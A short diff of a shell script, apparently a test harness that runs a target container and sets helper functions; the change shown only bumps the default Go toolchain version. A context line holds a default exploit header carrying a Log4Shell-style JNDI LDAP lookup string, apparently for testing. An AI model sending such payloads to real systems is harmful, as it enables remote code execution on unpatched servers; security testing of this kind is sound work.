@@ -40,7 +40,7 @@ EXPLOIT_HEADER=${EXPLOIT_HEADER:-'X-Api-Version: ${jndi:ldap://host.docker.inter
 ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 TMP="$(mktemp -d)"
 CONTAINER="pg-harness-target"
-GO=${GO:-go}; export GOTOOLCHAIN=${GOTOOLCHAIN:-go1.25.11}
+GO=${GO:-go}; export GOTOOLCHAIN=${GOTOOLCHAIN:-go1.25.12}
 
 say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
 ok()   { printf '  \033[32mok\033[0m %s\n' "$*"; }
